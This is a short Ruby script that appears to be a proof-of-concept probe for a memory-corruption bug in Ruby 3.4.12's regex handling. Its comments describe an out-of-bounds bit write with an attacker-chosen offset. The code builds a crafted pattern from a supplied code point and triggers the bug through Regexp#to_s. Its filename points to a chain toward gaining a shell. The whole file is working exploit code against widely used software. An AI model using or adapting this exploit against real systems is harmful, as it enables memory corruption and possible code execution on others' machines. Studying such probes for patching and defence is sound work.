#!/usr/bin/env ruby
# GHSA-7whj-cfh7-xgm4, Ruby 3.4.12: Regexp#to_s re-parses the raw pattern in
# rb_reg_str_with_term (re.c:628) without the preprocessing in 3.4.13.
# A pattern \x{CODEPOINT} above 0x10ffff reaches next_state_val
# (regparse.c:4589), whose BITSET_SET_BIT_CHKDUP(cc->bs, code) reads and
# one-bit-ORs cc->bs[code / 32] at bit code % 32: attacker-chosen offset/bit.
#
# Usage: ruby ruby2shell-tos-steer.rb HEX_CODEPOINT
#        TOS_CODE=HEX_CODEPOINT ruby ruby2shell-tos-steer.rb
# The probe itself uses no debugger, /proc or GC introspection.
hex = ARGV[0] || ENV.fetch('TOS_CODE')
code = Integer(hex, 16)
src = "(?:[](?#\\x{#{format('%X', code)}})])"
begin
  re = Regexp.new(src)
rescue RegexpError => e
  puts "REGEXPERROR #{e.message.lines.first.strip}"
  exit 0
end
puts re.to_s.inspect
